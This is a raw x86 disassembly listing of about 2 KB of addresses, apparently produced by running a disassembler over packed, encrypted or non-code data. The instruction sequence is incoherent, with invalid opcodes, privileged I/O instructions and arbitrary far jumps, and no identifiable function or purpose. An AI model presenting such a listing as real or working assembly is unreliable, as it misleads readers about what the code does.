  4174c3:	arpl   WORD PTR [esi],bx
  4174c5:	push   eax
  4174c6:	rcl    BYTE PTR [esi+0x29],1
  4174c9:	pop    esi
  4174ca:	or     BYTE PTR [eax-0x57f1b625],ah
  4174d0:	test   DWORD PTR [esi-0x393e2996],esi
  4174d6:	cs dec edx
  4174d8:	sub    ch,ah
  4174da:	inc    ecx
  4174db:	cmp    dh,ah
  4174dd:	adc    DWORD PTR [ebp-0xd],edi
  4174e0:	aad    0xf0
  4174e2:	add    edx,DWORD PTR [edi]
  4174e4:	in     eax,dx
  4174e5:	push   ecx
  4174e6:	push   ecx
  4174e7:	pop    edx
  4174e8:	addr16 int 0xa
  4174eb:	pushf  
  4174ec:	sar    ah,0x99
  4174ef:	pop    eax
  4174f0:	sub    ah,ch
  4174f2:	sub    al,0xed
  4174f4:	fldenv [ebx]
  4174f6:	pop    ds
  4174f7:	scas   eax,DWORD PTR es:[edi]
  4174f8:	jp     0x417525
  4174fa:	aas    
  4174fb:	iret   
  4174fc:	push   ds
  4174fd:	mov    ch,0x8d
  4174ff:	dec    edx
  417500:	rcl    BYTE PTR [ecx+ebx*1],cl
  417503:	xor    BYTE PTR [edx],al
  417505:	pop    es
  417506:	fadd   DWORD PTR [edi]
  417508:	pop    ecx
  417509:	jmp    0x18a6:0x469d03c2
  417510:	mov    DWORD PTR [ecx+0x30],edi
  417513:	and    al,0xa9
  417515:	call   0xfe7:0xb533f939
  41751c:	dec    ecx
  41751d:	adc    al,0xcc
  41751f:	rcl    BYTE PTR [edx*4-0x2137983],1
  417526:	hlt    
  417527:	xor    al,0x7d
  417529:	inc    DWORD PTR [edi+0x19]
  41752c:	sub    BYTE PTR [esi],bh
  41752e:	nop
  41752f:	xor    ch,ch
  417531:	mov    dh,0x33
  417533:	jl     0x41757d
  417535:	shr    DWORD PTR [esi+0x143980b2],0x27
  41753c:	cmp    BYTE PTR [ebx+0x24366697],0x5b
  417543:	sbb    edx,DWORD PTR [ebp-0x3d]
  417546:	call   0x548c8519
  41754b:	mov    WORD PTR [ebp+0x5d208f5b],cs
  417551:	mov    DWORD PTR [edi],esi
  417553:	(bad)
  417556:	xor    DWORD PTR [esi+0x4c946ddb],eax
  41755c:	lock jno 0x417567
  41755f:	rcr    DWORD PTR [esi+0x73],cl
  417562:	sub    al,0x75
  417564:	cwde   
  417565:	clc    
  417566:	outs   dx,DWORD PTR ds:[esi]
  417567:	jbe    0x4174f0
  417569:	outs   dx,DWORD PTR ds:[esi]
  41756a:	retf   0x1fd8
  41756d:	jae    0x41755d
  41756f:	stc    
  417570:	pop    edx
  417571:	mov    edi,0xa7398eef
  417576:	(bad)  
  417577:	enter  0x182d,0x30
  41757b:	cmp    eax,0xe5f1205
  417580:	cmp    BYTE PTR [edi-0x65],bh
  417583:	ins    DWORD PTR es:[edi],dx
  417584:	arpl   WORD PTR [esi-0x27],si
  417587:	jo     0x4175be
  417589:	add    ch,ah
  41758b:	jmp    0x417541
  41758d:	mov    esp,0xba343074
  417592:	inc    ebp
  417593:	fiadd  WORD PTR [ebx+0x1fda465a]
  417599:	fstp   DWORD PTR [ebx]
  41759b:	lods   al,BYTE PTR ds:[esi]
  41759c:	pop    ebx
  41759d:	push   0x30
  41759f:	sbb    BYTE PTR [ecx+0x1f],ah
  4175a2:	outs   dx,DWORD PTR ds:[esi]
  4175a3:	dec    edx
  4175a4:	popf   
  4175a5:	scas   al,BYTE PTR es:[edi]
  4175a6:	pop    ebx
  4175a7:	xor    DWORD PTR [ecx],esi
  4175a9:	jne    0x4175c0
  4175ab:	jmp    0x111c1064
  4175b0:	mov    ebp,0x273f4c9
  4175b5:	vandnps ymm4,ymm5,ymm2
  4175b9:	mov    ebp,0x87666e49
  4175be:	mov    dl,dh
  4175c0:	dec    bl
  4175c2:	sar    bl,0x88
  4175c5:	test   BYTE PTR [esp+ebp*2-0x22],dl
  4175c9:	jmp    0xebbe360d
  4175ce:	xchg   esi,eax
  4175cf:	jns    0x4175c5
  4175d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175d2:	mov    esi,0x8dab79e0
  4175d7:	or     ebp,eax
  4175d9:	fild   DWORD PTR [eax+0x46]
  4175dc:	jbe    0x417586
  4175de:	pop    esp
  4175df:	add    esi,DWORD PTR [edx]
  4175e1:	ret    
  4175e2:	out    dx,eax
  4175e3:	xor    al,0xf6
  4175e5:	inc    edx
  4175e6:	scas   al,BYTE PTR es:[edi]
  4175e7:	ret    
  4175e8:	mov    gs,WORD PTR [esi+0x5a]
  4175eb:	sub    DWORD PTR [ebx],0x264f0ffc
  4175f1:	mov    al,ds:0x1a9dd1cb
  4175f6:	cmp    al,0x5e
  4175f8:	jo     0x4175ee
  4175fa:	shl    DWORD PTR [ebx-0x6d29d339],cl
  417600:	jne    0x417665
  417602:	repnz ror BYTE PTR [eax+0x38],0x4a
  417607:	fwait
  417608:	fs dec ebp
  41760a:	cmp    DWORD PTR [ecx-0x44452617],esp
  417610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417611:	and    ebp,DWORD PTR [esi-0x45791b4d]
  417617:	xchg   DWORD PTR [ecx],edi
  417619:	jns    0x417669
  41761b:	add    eax,0x55ddc63c
  417620:	xlat   BYTE PTR ds:[ebx]
  417621:	jl     0x4175d9
  417623:	outs   dx,BYTE PTR ds:[esi]
  417624:	test   al,0xf3
  417626:	popf   
  417627:	clc    
  417628:	jge    0x4175de
  41762a:	xor    BYTE PTR [esi-0x2c],0xf2
  41762e:	std    
  41762f:	jo     0x4175d9
  417631:	add    eax,0x83475c96
  417636:	dec    esp
  417637:	jnp    0x417660
  417639:	push   DWORD PTR [edi-0x1f]
  41763c:	push   edx
  41763d:	fcmovnu st,st(3)
  41763f:	(bad)  
  417640:	jb     0x4176c0
  417642:	or     cl,0xd9
  417645:	dec    ebx
  417646:	pop    ds
  417647:	mov    cs,esi
  417649:	inc    ecx
  41764a:	outs   dx,BYTE PTR ds:[esi]
  41764b:	fmul   DWORD PTR [ebx-0x34a94563]
  417651:	pop    eax
  417652:	pop    ss
  417653:	push   edx
  417654:	adc    bh,dl
  417656:	mov    al,ds:0x27c351ad
  41765b:	and    eax,0x8884c63
  417660:	mov    esi,ecx
  417662:	out    0xab,eax
  417664:	clc    
  417665:	rcr    BYTE PTR [edx-0x73],1
  417668:	cs enter 0xe307,0xcb
  41766d:	or     ebp,DWORD PTR [ebx-0x2c]
  417670:	mov    ebp,0xbdbf26db
  417675:	inc    ecx
  417676:	and    ebp,esp
  417678:	sbb    BYTE PTR fs:[ebp+0x1a],cl
  41767c:	inc    ebx
  41767d:	stos   DWORD PTR es:[edi],eax
  41767e:	and    al,0x63
  417680:	in     al,dx
  417681:	stc    
  417682:	ss int3 
  417684:	cli    
  417685:	ret    
  417686:	or     DWORD PTR [edx+0x44],esp
  417689:	je     0x417666
  41768b:	adc    eax,0xa6bfcb24
  417690:	retf   0xa182
  417693:	in     al,dx
  417694:	mov    bl,0xe9
  417696:	ror    BYTE PTR [edi+0x18],0x86
  41769a:	mov    BYTE PTR [edx+0x3b7e80d],cl
  4176a0:	cld    
  4176a1:	sub    eax,0x297d3982
  4176a6:	shr    BYTE PTR [edi],cl
  4176a8:	sbb    ch,BYTE PTR [ebx-0x7f820581]
  4176ae:	cmp    edi,ebx
  4176b0:	add    eax,0x71efbaf7
  4176b5:	js     0x417679
  4176b7:	or     esp,DWORD PTR [ebp+0x6cb4f87b]
  4176bd:	push   ss
  4176be:	sub    al,BYTE PTR [ecx+0x7f]
  4176c1:	(bad)  
  4176c2:	outs   dx,BYTE PTR ds:[esi]
  4176c3:	jne    0x4176fa
  4176c5:	mov    bl,ch
  4176c7:	jp     0x4176e2
  4176c9:	jae    0x4176ca
  4176cb:	jns    0x417702
  4176cd:	(bad)  
  4176ce:	cli    
  4176cf:	js     0x41772e
  4176d1:	push   es
  4176d2:	cmp    esp,DWORD PTR [esi+0x66]
  4176d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176d6:	pop    ecx
  4176d7:	mov    edx,ecx
  4176d9:	out    dx,eax
  4176da:	in     eax,dx
  4176db:	sbb    BYTE PTR [esi-0x6],dh
  4176de:	ins    DWORD PTR es:[edi],dx
  4176df:	mov    bh,0xd8
  4176e1:	xor    esi,edx
  4176e3:	aaa    
  4176e4:	cmp    ebp,edi
  4176e6:	push   DWORD PTR ss:[ebp+0x73]
  4176ea:	fbld   TBYTE PTR [eax]
  4176ec:	xchg   ah,dl
  4176ee:	xor    eax,0x43536c02
  4176f3:	sbb    BYTE PTR [eax],0xe3
  4176f6:	mov    ah,0xb0
  4176f8:	mov    ch,0x53
  4176fa:	mov    ah,0xfc
  4176fc:	add    BYTE PTR gs:[ebx],ah
  4176ff:	push   ebx
  417700:	int    0xba
  417702:	sub    al,ah
  417704:	sub    dh,BYTE PTR [ebx-0x12]
  417707:	out    dx,al
  417708:	jbe    0x417780
  41770a:	and    DWORD PTR [ebx-0x62ae7201],0x8e976ba8
  417714:	(bad)  
  417715:	fcmovnbe st,st(0)
  417717:	into   
  417718:	xchg   esp,eax
  417719:	cmc    
  41771a:	es xor al,0xf8
  41771d:	xlat   BYTE PTR ds:[ebx]
  41771e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41771f:	sub    DWORD PTR [eax-0x60],ebx
  417722:	scas   al,BYTE PTR es:[edi]
  417723:	inc    bl
  417725:	mov    ah,BYTE PTR ds:0xb281aaea
  41772b:	(bad)  
  41772c:	mov    al,0x22
  41772e:	out    0x1c,al
  417730:	not    BYTE PTR [edi+eiz*1]
  417733:	aam    0x5e
  417735:	push   ecx
  417736:	dec    esp
  417737:	mov    dl,0xdd
  417739:	add    BYTE PTR [edi-0x14601d4d],cl
  41773f:	jnp    0x4176f7
  417741:	repz inc edi
  417743:	loopne 0x4176d3
  417745:	push   es
  417746:	pusha  
  417747:	mov    ebx,0xd5217dc2
  41774c:	push   esi
  41774d:	sbb    DWORD PTR [edx-0x23],0xffffffe7
  417751:	pop    esi
  417752:	js     0x417736
  417754:	inc    ebp
  417755:	mov    edx,DWORD PTR [ecx]
  417757:	add    al,0x9e
  417759:	dec    ebx
  41775a:	inc    edi
  41775b:	dec    esp
  41775c:	shr    eax,0x83
  41775f:	rcr    bh,cl
  417761:	cmp    al,0x2c
  417763:	push   ecx
  417764:	pop    ecx
  417765:	cmp    DWORD PTR [edi],0xd50555be
  41776b:	and    BYTE PTR [edi],dh
  41776d:	cmp    DWORD PTR ds:0xa138c99b,eax
  417773:	sub    BYTE PTR [esi],bl
  417775:	fcom   DWORD PTR [edx]
  417777:	outs   dx,DWORD PTR ds:[esi]
  417778:	jae    0x4177d6
  41777a:	mov    BYTE PTR [esp+eiz*2-0x3c3eb1c1],al
  417781:	lods   eax,DWORD PTR ds:[esi]
  417782:	inc    ecx
  417783:	icebp  
  417784:	xchg   dl,bh
  417786:	fwait
  417787:	sbb    BYTE PTR [esi+ebp*4-0x78ce300d],bl
  41778e:	add    DWORD PTR [edx+ecx*2-0x56ea30f7],ecx
  417795:	into   
  417796:	in     eax,dx
  417797:	sahf   
  417798:	add    BYTE PTR [edx],0x50
  41779b:	hlt    
  41779c:	int    0x72
  41779e:	push   0x4ef03013
  4177a3:	pop    ds
  4177a4:	and    eax,0x3ebbb179
  4177a9:	pop    ss
  4177aa:	scas   al,BYTE PTR es:[edi]
  4177ab:	lds    eax,FWORD PTR [ebx-0x7c]
  4177ae:	icebp  
  4177af:	fwait
  4177b0:	out    dx,al
  4177b1:	pushw  ds
  4177b3:	scas   eax,DWORD PTR es:[edi]
  4177b4:	ret    0x9e70
  4177b7:	test   BYTE PTR [esi-0x6d8a8cf6],bh
  4177bd:	xchg   DWORD PTR [eax+0x19],ebp
  4177c0:	jb     0x417821
  4177c2:	aaa    
  4177c3:	ins    DWORD PTR es:[edi],dx
  4177c4:	or     eax,0x91a0e9e6
  4177c9:	add    BYTE PTR [esi+0x4ceab9fc],bh
  4177cf:	popf   
  4177d0:	arpl   di,dx
  4177d2:	les    edx,FWORD PTR [eax+ecx*8+0x33]
  4177d6:	mov    esi,0x8a9860b8
  4177db:	or     eax,0x6c669a4d
  4177e0:	lods   al,BYTE PTR ds:[esi]
  4177e1:	lahf   
  4177e2:	scas   eax,DWORD PTR es:[edi]
  4177e3:	fld    QWORD PTR [esi+ebx*8-0x395acc1]
  4177ea:	test   DWORD PTR [edi+0x52],ecx
  4177ed:	mov    edi,0xa4318712
  4177f2:	jmp    0x8b1a4750
  4177f7:	fstp   DWORD PTR [esi+0x23]
  4177fa:	and    al,0x64
  4177fc:	test   BYTE PTR [eax],dh
  4177fe:	icebp  
  4177ff:	mov    dl,0x84
  417801:	clc    
  417802:	lock xchg edi,eax
  417804:	add    eax,0x3b9133b9
  417809:	push   edx
  41780a:	out    0xd7,eax
  41780c:	push   ebp
  41780d:	popa   
  41780e:	das    
  41780f:	push   0x5e10dbfe
  417814:	ror    DWORD PTR ds:0x20089c33,0x8e
  41781b:	push   ebp
  41781c:	pop    esp
  41781d:	jnp    0x417840
  41781f:	int    0xaa
  417821:	inc    ecx
  417822:	enter  0xcc2d,0x2
  417826:	mov    eax,ds:0x7719ab16
  41782b:	stos   BYTE PTR es:[edi],al
  41782c:	fnstenv [eax+ebp*2]
  41782f:	mov    edi,0x554762bd
  417834:	mov    al,0x54
  417836:	test   BYTE PTR [ebx+eiz*1],bl
  417839:	and    ch,dl
  41783b:	scas   al,BYTE PTR es:[edi]
  41783c:	repz cdq 
  41783e:	dec    esi
  41783f:	enter  0x2ee3,0xb2
  417843:	into   
  417844:	pop    ebp
  417845:	ins    DWORD PTR es:[edi],dx
  417846:	jno    0x41786e
  417848:	enter  0xe39c,0x7d
  41784c:	push   ecx
  41784d:	xor    bl,BYTE PTR [edx+edi*4+0x36349eb5]
  417854:	repnz cwd 
  417857:	test   eax,0x1f55b4d7
  41785c:	out    dx,eax
  41785d:	cli    
  41785e:	cwde   
  41785f:	or     eax,DWORD PTR [ebx+0x46e2c0fb]
  417865:	pop    ecx
  417866:	and    al,0xd9
  417868:	or     cl,BYTE PTR [ebp-0x5ca2b7ac]
  41786e:	test   al,0x82
  417870:	jl     0x4178a5
  417872:	(bad)  
  417873:	mov    edi,0xdc47525e
  417878:	add    al,0x8b
  41787a:	outs   dx,BYTE PTR ds:[esi]
  41787b:	dec    edi
  41787c:	jbe    0x417852
  41787e:	adc    ch,dl
  417880:	fist   WORD PTR [edi+ecx*4]
  417883:	stc    
  417884:	imul   ecx,edi,0x49
  417887:	adc    eax,0x77297835
  41788c:	pop    ds
  41788d:	call   0x13849f70
  417892:	loop   0x417833
  417894:	aas    
  417895:	or     ecx,0x955dd419
  41789b:	fistp  WORD PTR [eax+edx*8+0x2b]
  41789f:	lods   al,BYTE PTR ds:[esi]
  4178a0:	fs aam 0xcf
  4178a3:	or     al,0x2e
  4178a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178a6:	pusha  
  4178a7:	test   eax,0xc2d1ac1f
  4178ac:	xchg   DWORD PTR [esi-0x74],eax
  4178af:	imul   edx,DWORD PTR [edx-0x9cd60b0],0x3f
  4178b6:	inc    ebx
  4178b7:	xlat   BYTE PTR ds:[ebx]
  4178b8:	(bad)  
  4178b9:	jle    0x41789b
  4178bb:	sbb    esp,ebp
  4178bd:	push   0xffffffb1
  4178bf:	pop    ebx
  4178c0:	sub    eax,0x79b5889
  4178c5:	es out 0x28,eax
  4178c8:	adc    al,0x39
  4178ca:	jl     0x4178ad
  4178cc:	pop    ds
  4178cd:	imul   ebp,DWORD PTR [edx],0x4575b939
  4178d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178d4:	ficomp WORD PTR [ebx]
  4178d6:	out    dx,eax
  4178d7:	cmp    dh,ah
  4178d9:	mov    ebx,0x1df80170
  4178de:	lahf   
  4178df:	fadd   QWORD PTR [ecx-0x4f999ef4]
  4178e5:	fimul  DWORD PTR [edx-0x630957b8]
  4178eb:	or     al,0xe3
  4178ed:	and    esi,esi
  4178ef:	fnstcw WORD PTR [edx+0x60462d2c]
  4178f5:	ins    DWORD PTR es:[edi],dx
  4178f6:	icebp  
  4178f7:	stos   BYTE PTR es:[edi],al
  4178f8:	daa    
  4178f9:	jo     0x417957
  4178fb:	cld    
  4178fc:	fstp   TBYTE PTR [edi+0x23]
  4178ff:	push   0x5c08a166
  417904:	loope  0x4178b4
  417906:	mov    ds:0xbc585a7b,eax
  41790b:	add    dl,ch
  41790d:	and    DWORD PTR [edi],0x5b
  417910:	inc    esi
  417911:	retf   
  417912:	cdq    
  417913:	clc    
  417914:	xor    al,0x96
  417916:	cmp    BYTE PTR [esi],0x30
  417919:	jae    0x4178bd
  41791b:	add    eax,0x8c294768
  417920:	jb     0x4178e9
  417922:	jnp    0x4178c2
  417924:	leave  
  417925:	inc    edx
  417926:	mov    edi,0x7ad1a167
  41792b:	inc    edx
  41792c:	jb     0x417955
  41792e:	adc    al,0x29
  417930:	int    0x6
  417932:	xor    bl,BYTE PTR [edx+eiz*8+0x12a53796]
  417939:	cs pop ss
  41793b:	jns    0x4178f6
  41793d:	jle    0x4178e9
  41793f:	pop    eax
  417940:	adc    eax,0x280ad71
  417945:	dec    esp
  417946:	push   0x9a00926c
  41794b:	dec    esi
  41794c:	iret   
  41794d:	sbb    DWORD PTR [ecx+0x65388769],esp
  417953:	sub    eax,0xa26966a1
  417958:	pop    edx
  417959:	xor    dh,cl
  41795b:	outs   dx,BYTE PTR ds:[esi]
  41795c:	lock pop ds
  41795e:	push   ecx
  41795f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417960:	or     al,0x75
  417962:	jbe    0x41798d
  417964:	xchg   DWORD PTR ds:0x791bebbb,edx
  41796a:	add    BYTE PTR [ebp-0x4a08db96],0x56
  417971:	ss push eax
  417973:	sub    DWORD PTR [ecx-0x589e5327],ebx
  417979:	xor    ecx,DWORD PTR [ebp-0x663a22a4]
  41797f:	loop   0x417935
  417981:	and    al,0xeb
  417983:	push   DWORD PTR [ebx+0x58]
  417986:	out    0x47,al
  417988:	cs dec ebx
  41798a:	mov    eax,ds:0x5a042bc7
  41798f:	sbb    edx,esi
  417991:	xchg   BYTE PTR [edi-0x6cd18adb],ch
  417997:	imul   edi,DWORD PTR [edi+eax*1+0x42],0xffffffb1
  41799c:	(bad)  
  41799d:	in     eax,0x72
  41799f:	adc    al,0x52
  4179a1:	xchg   ebx,eax
  4179a2:	bound  ecx,QWORD PTR [eax]
  4179a4:	(bad)  
  4179a5:	ds adc eax,0xa3836e07
  4179ab:	push   ecx
  4179ac:	arpl   WORD PTR [ebp-0x79a82021],di
  4179b2:	push   ss
  4179b3:	repnz cmc 
  4179b5:	jmp    0x417953
  4179b7:	and    BYTE PTR [eax-0x1b],dh
  4179ba:	ins    DWORD PTR es:[edi],dx
  4179bb:	cmp    al,0x7d
  4179bd:	mov    ch,0x7a
  4179bf:	or     bh,cl
  4179c1:	cli    
  4179c2:	push   0xb70bf4d9
  4179c7:	cmp    BYTE PTR [edx-0x17ee376a],0xe6
  4179ce:	adc    eax,0xec02c245
  4179d3:	cwde   
  4179d4:	loope  0x417a45
  4179d6:	push   esi
  4179d7:	xor    al,0x2d
  4179d9:	pop    ss
  4179da:	dec    ebx
  4179db:	lods   al,BYTE PTR ds:[esi]
  4179dc:	scas   al,BYTE PTR es:[edi]
  4179dd:	jle    0x4179d4
  4179df:	sbb    dl,dl
  4179e1:	cmp    DWORD PTR [edi],edi
  4179e3:	mov    dh,0x43
  4179e5:	xor    al,0xa7
  4179e7:	mov    esi,0xc882b60
  4179ec:	pop    edx
  4179ed:	sbb    BYTE PTR [eax+0x24],dl
  4179f0:	push   es
  4179f1:	hlt    
  4179f2:	(bad)  
  4179f3:	into   
  4179f4:	push   esp
  4179f5:	mov    gs,WORD PTR [edx]
  4179f7:	mov    ebp,0xd5047b17
  4179fc:	add    eax,0x66f85db6
  417a01:	loop   0x4179bd
  417a03:	or     al,0x15
  417a05:	imul   esp,DWORD PTR [ecx],0xffffffec
  417a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a09:	cli    
  417a0a:	mov    bh,0x4a
  417a0c:	xchg   esi,eax
  417a0d:	scas   al,BYTE PTR es:[edi]
  417a0e:	pushf  
  417a0f:	and    bh,BYTE PTR [ebp+0x50]
  417a12:	nop
  417a13:	pop    edi
  417a14:	fwait
  417a15:	lahf   
  417a16:	pop    ecx
  417a17:	and    ecx,DWORD PTR [esp+ecx*1]
  417a1a:	xchg   ebp,eax
  417a1b:	mov    ah,0x7
  417a1d:	daa    
  417a1e:	xchg   DWORD PTR cs:[edi+ecx*8-0x11],ebp
  417a23:	jecxz  0x417a38
  417a25:	inc    esp
  417a26:	push   edi
  417a27:	jb     0x417a38
  417a29:	dec    edx
  417a2a:	sar    al,0x4
  417a2d:	jb     0x4179f9
  417a2f:	cmpps  xmm4,XMMWORD PTR [edx-0x29bf899f],0x88
  417a37:	out    0xf,eax
  417a39:	sub    DWORD PTR [edi],edx
  417a3b:	push   0x50e8ec9a
  417a40:	mov    eax,0x10bbe7fc
  417a45:	cmp    ecx,ecx
  417a47:	into   
  417a48:	mov    al,ds:0xebd01beb
  417a4d:	xchg   esi,eax
  417a4e:	or     al,0x81
  417a50:	das    
  417a51:	add    BYTE PTR [esi+0x65f8c787],0x51
  417a58:	sbb    BYTE PTR [ecx],ch
  417a5a:	pop    edi
  417a5b:	jns    0x417a98
  417a5d:	sti    
  417a5e:	jae    0x417aa2
  417a60:	fidivr WORD PTR [ecx-0x1c]
  417a63:	mov    al,0xd
  417a65:	or     BYTE PTR [esi+0x196f0b45],0x7b
  417a6c:	xchg   esi,eax
  417a6d:	stos   BYTE PTR es:[edi],al
  417a6e:	or     edi,DWORD PTR [edx-0x3]
  417a71:	inc    ebp
  417a72:	inc    eax
  417a73:	inc    ebx
  417a74:	pop    ebx
  417a75:	test   BYTE PTR ds:0x6049155f,0xb3
  417a7c:	xor    al,0x2
  417a7e:	xchg   DWORD PTR [edi+0x32f13d83],ebp
  417a84:	adc    esi,DWORD PTR [esi]
  417a86:	cmp    bl,0x6a
  417a89:	repz sub al,0x2a
  417a8c:	mov    cl,dl
  417a8e:	pop    ds
  417a8f:	inc    ebx
  417a90:	bound  ebp,QWORD PTR [edx]
  417a92:	mov    WORD PTR [edi+0x47],?
  417a95:	jge    0x417af9
  417a97:	retf   
  417a98:	adc    BYTE PTR [ecx],cl
  417a9a:	mov    ds:0x3877a220,al
  417a9f:	fmul   st,st(1)
  417aa1:	inc    edi
  417aa2:	test   DWORD PTR [ecx-0x6e],ebx
  417aa5:	dec    BYTE PTR [edx+eax*8-0x3d053411]
  417aac:	and    DWORD PTR [edx],edi
  417aae:	inc    ebp
  417aaf:	pop    esp
  417ab0:	int    0x4d
  417ab2:	icebp  
  417ab3:	mov    eax,ds:0x57d5cc74
  417ab8:	cmp    ch,bl
  417aba:	imul   ebp,DWORD PTR [ebx],0x66c36389
  417ac0:	xor    eax,0x14b9277e
  417ac5:	cmp    ch,dh
  417ac7:	test   eax,0x1a668bc6
  417acc:	fs addr16 pop di
  417ad0:	dec    eax
  417ad1:	mov    ah,0xda
  417ad3:	jb     0x417aa5
  417ad5:	jbe    0x417a5f
  417ad7:	sub    al,0xe2
  417ad9:	cmc    
  417ada:	mov    bh,bl
  417adc:	loop   0x417a63
  417ade:	(bad)  
  417adf:	mov    bh,0xc7
  417ae1:	(bad)  
  417ae2:	fs jcxz 0x417ac1
  417ae6:	test   DWORD PTR [ebx],ebx
  417ae8:	sbb    edi,0x2b
  417aeb:	fs cld 
  417aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aee:	stos   BYTE PTR es:[edi],al
  417aef:	(bad)  
  417af0:	pop    ebx
  417af1:	xchg   ebx,eax
  417af2:	retf   
  417af3:	xchg   ebx,eax
  417af4:	inc    edx
  417af5:	scas   eax,DWORD PTR es:[edi]
  417af6:	imul   ecx,DWORD PTR [esp+edx*2+0x21ffaa23],0xffffffa8
  417afe:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b00:	js     0x417af2
  417b02:	ja     0x417aee
  417b04:	jbe    0x417ad4
  417b06:	mov    esi,0xa2562362
  417b0b:	rcr    DWORD PTR [eax+0x7c],0x3b
  417b0f:	jbe    0x417b7b
  417b11:	shr    DWORD PTR [edx-0x1c14b185],cl
  417b17:	pop    esp
  417b18:	loopne 0x417b99
  417b1a:	sub    eax,0x60a071f4
  417b1f:	test   eax,0x2b885111
  417b24:	cdq    
  417b25:	add    dl,ch
  417b27:	inc    ebp
  417b28:	lock leave 
  417b2a:	outs   dx,BYTE PTR ds:[esi]
  417b2b:	adc    eax,0x16fe0832
  417b30:	(bad)  
  417b31:	push   edi
  417b32:	sti    
  417b33:	pop    ecx
  417b34:	or     BYTE PTR [esi],dl
  417b36:	mov    bl,0xf3
  417b38:	cli    
  417b39:	lods   al,BYTE PTR ds:[esi]
  417b3a:	add    DWORD PTR [ebx+0x0],0x29
  417b3e:	sti    
  417b3f:	int3   
  417b40:	jo     0x417b28
  417b42:	sub    DWORD PTR [edi],edx
  417b44:	test   esp,0xabf486c2
  417b4a:	dec    esp
  417b4b:	in     al,dx
  417b4c:	cmp    ebp,DWORD PTR [ecx]
  417b4e:	cs scas eax,DWORD PTR es:[edi]
  417b50:	std    
  417b51:	pop    eax
  417b52:	cmovs  edi,DWORD PTR [ecx]
  417b55:	scas   al,BYTE PTR es:[edi]
  417b56:	test   BYTE PTR [edi+0x55],0xc0
  417b5a:	(bad)  
  417b5b:	and    esi,DWORD PTR [ecx]
  417b5d:	daa    
  417b5e:	and    eax,0xf9a0af72
  417b63:	fistp  DWORD PTR [edx]
  417b65:	loope  0x417aef
  417b67:	jb     0x417bcb
  417b69:	cdq    
  417b6a:	in     eax,dx
  417b6b:	fcomi  st,st(3)
  417b6d:	mov    esp,0x6c3d40bf
  417b72:	(bad)  [esi-0x2ac79e11]
  417b78:	data16 test BYTE PTR [ebp+0x1fc22ef3],al
  417b7f:	popa   
  417b80:	jle    0x417b80
  417b82:	or     eax,0x8fb1de10
  417b87:	inc    esi
  417b88:	mov    ds:0xdcd35396,al
  417b8d:	push   ds
  417b8e:	enter  0xce3b,0xe0
  417b92:	mov    edx,0x60cef14d
  417b97:	and    eax,0xa82dd733
  417b9c:	aas    
  417b9d:	fadd   st,st(1)
  417b9f:	xor    ch,0x19
  417ba2:	mov    dh,0xb4
  417ba4:	idiv   DWORD PTR [ecx-0x60bcedb1]
  417baa:	xchg   edx,eax
  417bab:	jmp    0x417c27
  417bad:	jmp    0x417bf9
  417baf:	xchg   esp,edi
  417bb1:	add    ch,ah
  417bb3:	(bad)  
  417bb4:	or     BYTE PTR [edx],bh
  417bb6:	gs pop eax
  417bb8:	pop    ds
  417bb9:	stos   BYTE PTR es:[edi],al
  417bba:	ss jle 0x417bad
  417bbd:	ds mov bh,0x8b
  417bc0:	jae    0x417b72
  417bc2:	loopne 0x417b6a
  417bc4:	outs   dx,BYTE PTR ds:[esi]
  417bc5:	push   0xf1755e09
  417bca:	xor    DWORD PTR [edx+ebx*1+0x2],esi
  417bce:	jae    0x417b5f
  417bd0:	hlt    
  417bd1:	or     BYTE PTR [esi+ebp*2],ah
  417bd4:	xchg   edx,eax
  417bd5:	adc    ah,BYTE PTR [ebx-0x274f5b2d]
  417bdb:	jmp    0x3d29:0x6c172e22
  417be2:	mov    ds:0xa43064ce,eax
  417be7:	retf   
  417be8:	punpckhbw mm2,QWORD PTR [esp+ebp*2-0x2]
  417bed:	sbb    al,0x71
  417bef:	jne    0x417bd2
  417bf1:	add    eax,0x93d639fc
  417bf6:	pop    edi
  417bf7:	in     al,dx
  417bf8:	fcmovnbe st,st(6)
  417bfa:	jb     0x417bae
  417bfc:	call   0x1919:0x211af79a
  417c03:	bound  ebp,QWORD PTR [ecx]
  417c05:	push   es
  417c06:	push   esi
  417c07:	enter  0x562e,0x53
  417c0b:	adc    al,0x83
  417c0d:	loope  0x417c71
  417c0f:	call   0xd4b356e6
  417c14:	dec    ebx
  417c15:	xor    eax,0x12f4eb42
  417c1a:	or     eax,0x7bfae142
  417c1f:	fidiv  WORD PTR [ecx+0x5d]
  417c22:	fcmovnb st,st(2)
  417c24:	pop    ds
  417c25:	fisubr WORD PTR [eax-0x4a]
  417c28:	fcmovbe st,st(7)
  417c2a:	mov    ebp,0x42e15f95
  417c2f:	jb     0x417c72
  417c31:	sbb    DWORD PTR [edx+0x6f1c837f],0x39
  417c38:	push   ecx
  417c39:	out    dx,eax
  417c3a:	rcl    BYTE PTR [ebx-0x1f],0xc2
  417c3e:	cmp    esi,DWORD PTR [esi-0x79]
  417c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c42:	add    eax,0x140c2e12
  417c47:	mov    ebx,0x497b1933
  417c4c:	mov    ecx,0x226bcbe0
  417c51:	add    al,0xa1
  417c53:	xor    eax,0xec69d64
  417c58:	xor    DWORD PTR [ebx-0x4c],ecx
  417c5b:	mov    cl,0x81
  417c5d:	xlat   BYTE PTR ds:[ebx]
  417c5e:	clc    
  417c5f:	sbb    eax,0xc5e451fe
  417c64:	mov    bh,0x11
  417c66:	call   0xf9c11ef3
  417c6b:	pop    ebx
  417c6c:	in     eax,dx
  417c6d:	mov    edi,0x47f3f1b4
  417c72:	mov    edi,0xdb1dccd2
  417c77:	int3   
  417c78:	inc    ecx
  417c79:	pop    es
  417c7a:	stos   DWORD PTR es:[edi],eax
  417c7b:	add    edi,DWORD PTR [ecx]
  417c7d:	inc    ebx
  417c7e:	ja     0x417ce7
